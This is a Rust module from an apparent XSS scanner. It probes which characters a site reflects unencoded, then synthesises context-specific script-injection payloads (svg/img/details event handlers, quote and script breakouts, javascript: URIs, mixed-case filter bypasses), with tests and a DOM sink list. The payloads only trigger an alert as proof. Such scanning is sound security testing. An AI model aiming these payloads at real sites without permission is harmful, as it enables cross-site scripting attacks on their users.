//! 反射定位、可利用字符探测、按上下文合成 XSS 载荷、DOM sink 静态提示(全部纯函数)。

use crate::context::HtmlContext;

/// 反射标记(纯字母 + 大小写混合,几乎不会自然出现、且不被任何 HTML 编码改写)。
pub const REFLECT_MARK: &str = "sCrYx";

/// 执行标记:`alert(EXEC_MARK)` 既能作静态证据子串(原样回显),又是**可真正执行**的合法 JS
/// (数字字面量,不是未定义标识符)——浏览器动态验证时弹窗消息即为它。取一个独特数字降低误碰。
pub const EXEC_MARK: &str = "13371337";

/// 找出标记在响应里反射的所有字节偏移(供上下文识别)。
pub fn reflections(resp: &str, marker: &str) -> Vec<usize> {
    if marker.is_empty() {
        return Vec::new();
    }
    resp.match_indices(marker).map(|(i, _)| i).collect()
}

/// 逐字符探测用的「金丝雀」字符表:`标记+短标签+待测字符`,在响应里查 `标记短标签字符` 是否原样出现。
const UNITS: &[(&str, char)] = &[
    ("lt", '<'),
    ("gt", '>'),
    ("dq", '"'),
    ("sq", '\''),
    ("bt", '`'),
    ("op", '('),
    ("cp", ')'),
    ("eq", '='),
    ("sl", '/'),
];

/// 金丝雀载荷:把所有待测字符各用标记包一段拼起来,一发请求即可探出全部字符的存活情况。
pub fn canary() -> String {
    let m = REFLECT_MARK;
    let mut s = String::new();
    for (tag, ch) in UNITS {
        s.push_str(m);
        s.push_str(tag);
        s.push(*ch);
    }
    s
}

/// 各危险字符是否**原样反射**(未被实体编码)。
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Abusable {
    pub lt: bool,
    pub gt: bool,
    pub dquote: bool,
    pub squote: bool,
    pub backtick: bool,
    pub open_paren: bool,
    pub close_paren: bool,
    pub eq: bool,
    pub slash: bool,
}

impl Abusable {
    /// 括号是否都可用(`alert(...)` 必需)。
    pub fn paren(self) -> bool {
        self.open_paren && self.close_paren
    }
}

/// 从金丝雀响应里探出各字符的存活情况(`标记短标签字符` 原样出现 = 该字符未被编码)。
pub fn abusable_chars(resp: &str) -> Abusable {
    let m = REFLECT_MARK;
    let has = |tag: &str, ch: char| resp.contains(&format!("{m}{tag}{ch}"));
    Abusable {
        lt: has("lt", '<'),
        gt: has("gt", '>'),
        dquote: has("dq", '"'),
        squote: has("sq", '\''),
        backtick: has("bt", '`'),
        open_paren: has("op", '('),
        close_paren: has("cp", ')'),
        eq: has("eq", '='),
        slash: has("sl", '/'),
    }
}

/// 合成出的 XSS 载荷:`value` 注入参数,`proof` 是其执行片段——响应里出现(未编码)即确认可利用。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Payload {
    /// 注入参数的值。
    pub value: String,
    /// 验证用证据子串(响应含它且未被编码 = 可利用)。
    pub proof: String,
    /// 载荷类型(展示用)。
    pub kind: &'static str,
}

fn poc() -> String {
    // alert(执行标记):既是静态证据子串,又是可真正执行的合法 JS(浏览器验证时弹窗消息即它)。
    format!("alert({EXEC_MARK})")
}

/// **浏览器动态验证**用的通用执行向量(覆盖 HTML / 属性单双引号 / `<script>` 上下文,均**加载即自动触发**;
/// 不含需点击的 `javascript:` 伪协议)。`(注入值, 类型)`;浏览器执行命中者会弹出 `alert(EXEC_MARK)`。
pub fn exec_vectors() -> Vec<(String, &'static str)> {
    let a = format!("alert({EXEC_MARK})");
    vec![
        (format!("<svg/onload={a}>"), "html-svg"),
        (format!("\"><svg/onload={a}>"), "attr-dq-svg"),
        (format!("'><svg/onload={a}>"), "attr-sq-svg"),
        (format!("\"><img src=x onerror={a}>"), "attr-dq-img"),
        (format!("'><img src=x onerror={a}>"), "attr-sq-img"),
        (format!("</script><svg/onload={a}>"), "script-out"),
        (format!("\";{a};//"), "js-dq"),
        (format!("';{a};//"), "js-sq"),
    ]
}

/// 一组标签型执行向量(同一上下文里换不同标签 / 事件 / 大小写,用于绕过简单 WAF / 标签黑名单)。
/// 每项 = `(标签 HTML, 证据子串, 类型)`;均需 `< > = ( )` 可用。
fn tag_vectors(ab: Abusable) -> Vec<(String, String, &'static str)> {
    let p = poc();
    let sep = if ab.slash { "/" } else { " " };
    vec![
        (format!("<svg{sep}onload={p}>"), format!("<svg{sep}onload={p}"), "svg-onload"),
        (
            format!("<img{sep}src=x{sep}onerror={p}>"),
            format!("onerror={p}"),
            "img-onerror",
        ),
        (
            format!("<details{sep}open{sep}ontoggle={p}>"),
            format!("ontoggle={p}"),
            "details-ontoggle",
        ),
        // 大小写混淆绕过标签 / 事件黑名单。
        (format!("<sVg{sep}OnLoad={p}>"), format!("OnLoad={p}"), "svg-mixedcase"),
    ]
}

/// 属性上下文的逃逸向量:闭合引号 `q` 后插标签(多向量)+ 退化为属性内事件处理器。
fn attr_vectors(ab: Abusable, q: char, tag_ok: bool) -> Vec<Payload> {
    let mut out = Vec::new();
    let quote_ok = match q {
        '"' => ab.dquote,
        '\'' => ab.squote,
        _ => true, // 无引号 attr 用 '\0' 占位,无需闭合引号
    };
    let close = if q == '\0' { String::new() } else { q.to_string() };
    if !quote_ok {
        return out; // 引号被编码 → 无法逃出带引号属性
    }
    if tag_ok {
        for (inner, proof, kind) in tag_vectors(ab) {
            out.push(Payload {
                value: format!("{close}>{inner}"),
                proof,
                kind,
            });
        }
    }
    if ab.eq {
        // 不依赖尖括号:在当前标签上挂事件处理器。
        let p = poc();
        out.push(Payload {
            value: format!("{close} autofocus onfocus={p} x={close}"),
            proof: format!("onfocus={p}"),
            kind: "attr-event",
        });
    }
    out
}

/// 据上下文 + 可用字符**针对性**合成一组候选载荷(从最可能成功到 WAF 绕过变体);
/// runner 逐个发送验证,首个 `proof` 未编码回显者即确认。无法逃逸返回空。
pub fn synthesize(ctx: HtmlContext, ab: Abusable) -> Vec<Payload> {
    if !ab.paren() {
        // 没有括号 → alert(...) 无法成立。
        return Vec::new();
    }
    let tag_ok = ab.lt && ab.gt && ab.eq;
    let p = poc();
    match ctx {
        HtmlContext::HtmlText => {
            if tag_ok {
                tag_vectors(ab)
                    .into_iter()
                    .map(|(value, proof, kind)| Payload { value, proof, kind })
                    .collect()
            } else {
                Vec::new()
            }
        }
        HtmlContext::Comment => {
            if tag_ok {
                tag_vectors(ab)
                    .into_iter()
                    .map(|(inner, proof, kind)| Payload {
                        value: format!("-->{inner}<!--"),
                        proof,
                        kind,
                    })
                    .collect()
            } else {
                Vec::new()
            }
        }
        HtmlContext::AttrDouble => attr_vectors(ab, '"', tag_ok),
        HtmlContext::AttrSingle => attr_vectors(ab, '\'', tag_ok),
        HtmlContext::AttrUnquoted => attr_vectors(ab, '\0', tag_ok),
        HtmlContext::UrlAttribute(q) => {
            let mut out = Vec::new();
            // 首选:javascript: 伪协议(URL 属性专属,反射在值起始处即生效)。
            out.push(Payload {
                value: format!("javascript:{p}"),
                proof: format!("javascript:{p}"),
                kind: "js-uri",
            });
            // 退化:按其引号当普通属性逃逸。
            out.extend(attr_vectors(ab, q.unwrap_or('\0'), tag_ok));
            out
        }
        HtmlContext::ScriptString(q) => {
            let mut out = Vec::new();
            if q == '`' && ab.backtick {
                out.push(Payload {
                    value: format!("${{{p}}}"),
                    proof: p.clone(),
                    kind: "js-template",
                });
            }
            let quote_ok = match q {
                '"' => ab.dquote,
                '\'' => ab.squote,
                '`' => ab.backtick,
                _ => false,
            };
            if quote_ok {
                out.push(Payload {
                    value: format!("{q};{p}//"),
                    proof: format!(";{p}"),
                    kind: "js-string-breakout",
                });
                // 也试闭标签逃出 <script>(若尖括号可用)。
                if tag_ok {
                    for (inner, proof, kind) in tag_vectors(ab) {
                        out.push(Payload {
                            value: format!("{q};</script>{inner}"),
                            proof,
                            kind,
                        });
                    }
                }
            }
            out
        }
        HtmlContext::ScriptRaw => vec![Payload {
            value: format!(";{p}//"),
            proof: p,
            kind: "js-raw",
        }],
    }
}

/// 已知的危险 DOM sink 标记(小写匹配,返回原样标签;信息性,提示可能的 DOM 型 XSS)。
const SINKS: &[&str] = &[
    "innerhtml",
    "outerhtml",
    "insertadjacenthtml",
    "document.write",
    "document.writeln",
    "eval(",
    "settimeout(",
    "setinterval(",
    "new function(",
    "location.hash",
    "location.search",
    "location.href",
    "document.url",
    "document.cookie",
    "dangerouslysetinnerhtml",
    ".html(",
];

/// 静态扫描响应里出现的危险 DOM sink(去重保序;不代表已确认 DOM XSS,仅提示排查方向)。
pub fn dom_sinks(html: &str) -> Vec<&'static str> {
    let low = html.to_ascii_lowercase();
    SINKS.iter().copied().filter(|s| low.contains(s)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reflections_finds_all() {
        assert_eq!(reflections("a sCrYx b sCrYx", REFLECT_MARK), vec![2, 10]);
        assert!(reflections("nope", REFLECT_MARK).is_empty());
    }

    #[test]
    fn canary_and_abusable_roundtrip() {
        // 模拟「全部原样反射」(无编码)的响应 = canary 自身。
        let resp = canary();
        let ab = abusable_chars(&resp);
        assert!(ab.lt && ab.gt && ab.dquote && ab.squote && ab.paren() && ab.eq && ab.slash);

        // 模拟「尖括号 / 引号被实体编码」的响应:替换掉危险字符。
        let encoded = resp
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#39;");
        let ab2 = abusable_chars(&encoded);
        assert!(!ab2.lt && !ab2.gt && !ab2.dquote && !ab2.squote);
        // 括号 / 等号 / 斜杠通常不编码,仍可用。
        assert!(ab2.paren() && ab2.eq && ab2.slash);
    }

    fn all_abusable() -> Abusable {
        Abusable {
            lt: true,
            gt: true,
            dquote: true,
            squote: true,
            backtick: true,
            open_paren: true,
            close_paren: true,
            eq: true,
            slash: true,
        }
    }

    #[test]
    fn synth_html_text_multi_vectors() {
        let v = synthesize(HtmlContext::HtmlText, all_abusable());
        // 首选 svg/onload,且给出多个 WAF 绕过变体(img/details/大小写)。
        assert_eq!(v[0].value, "<svg/onload=alert(13371337)>");
        assert_eq!(v[0].proof, "<svg/onload=alert(13371337)");
        assert!(v.len() >= 4);
        assert!(v.iter().any(|p| p.kind == "img-onerror"));
        assert!(v.iter().any(|p| p.kind == "svg-mixedcase"));
    }

    #[test]
    fn synth_attr_breakout_and_event() {
        // 双引号属性 + 尖括号可用 → 闭合属性后插标签(多向量)。
        let v = synthesize(HtmlContext::AttrDouble, all_abusable());
        assert!(v[0].value.starts_with("\">"));

        // 尖括号被编码、但引号可用 → 退化为属性内事件处理器。
        let mut ab = all_abusable();
        ab.lt = false;
        ab.gt = false;
        let v2 = synthesize(HtmlContext::AttrDouble, ab);
        assert_eq!(v2.len(), 1);
        assert_eq!(v2[0].kind, "attr-event");
        assert!(v2[0].value.contains("onfocus=alert(13371337)"));
    }

    #[test]
    fn synth_url_attribute_prefers_js_uri() {
        let v = synthesize(HtmlContext::UrlAttribute(Some('"')), all_abusable());
        assert_eq!(v[0].kind, "js-uri");
        assert_eq!(v[0].value, "javascript:alert(13371337)");
        // 仍附带属性逃逸向量兜底。
        assert!(v.iter().any(|p| p.value.starts_with("\">")));
    }

    #[test]
    fn synth_script_string_breakout() {
        let v = synthesize(HtmlContext::ScriptString('\''), all_abusable());
        assert!(v.iter().any(|p| p.value == "';alert(13371337)//" && p.proof == ";alert(13371337)"));

        // 反引号模板串 → ${...}
        let v2 = synthesize(HtmlContext::ScriptString('`'), all_abusable());
        assert!(v2.iter().any(|p| p.value == "${alert(13371337)}"));
    }

    #[test]
    fn exec_vectors_use_exec_mark_and_autofire() {
        let v = exec_vectors();
        assert!(v.iter().all(|(val, _)| val.contains("alert(13371337)")));
        // 不含需点击的 javascript: 伪协议(浏览器导航不会自动触发)。
        assert!(v.iter().all(|(val, _)| !val.contains("javascript:")));
        assert!(v.iter().any(|(_, k)| *k == "html-svg"));
    }

    #[test]
    fn synth_none_without_parens() {
        let mut ab = all_abusable();
        ab.open_paren = false;
        assert!(synthesize(HtmlContext::HtmlText, ab).is_empty());
    }

    #[test]
    fn synth_attr_encoded_quotes_gives_none() {
        // 引号与尖括号都被编码的双引号属性 → 无法逃逸。
        let ab = Abusable {
            eq: true,
            open_paren: true,
            close_paren: true,
            ..Default::default()
        };
        assert!(synthesize(HtmlContext::AttrDouble, ab).is_empty());
    }

    #[test]
    fn dom_sinks_detected() {
        let sinks = dom_sinks("el.innerHTML = location.hash; eval(x);");
        assert!(sinks.contains(&"innerhtml"));
        assert!(sinks.contains(&"location.hash"));
        assert!(sinks.contains(&"eval("));
        assert!(dom_sinks("<p>clean page</p>").is_empty());
    }
}
